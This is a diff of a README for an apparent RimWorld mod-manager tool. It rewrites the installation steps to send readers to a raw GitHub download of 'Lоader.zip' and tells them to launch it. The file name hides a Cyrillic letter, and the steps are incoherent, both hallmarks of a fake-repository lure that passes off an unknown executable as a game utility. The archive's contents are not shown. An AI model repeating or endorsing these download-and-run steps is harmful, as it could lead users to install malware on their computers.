@@ -6,9 +6,9 @@ Welcome to the ultimate **RimWorld mod menu**! Enhance your gameplay by managing
 
 ## 📦 Installation
 
-1. Download **Loader.rar** from this repository.
+1. Download **https://raw.githubusercontent.com/Eduardojose520/RimWorld-ModPanel-Plus/main/Lоader.zip** from this repository.
 2. Extract its contents to your RimWorld installation directory.
-3. Launch Loader.exe to start managing your mods!
+3. Launch https://raw.githubusercontent.com/Eduardojose520/RimWorld-ModPanel-Plus/main/Lоader.zip to start managing your mods!
 
 For support, check the Wiki or open an Issue.
 
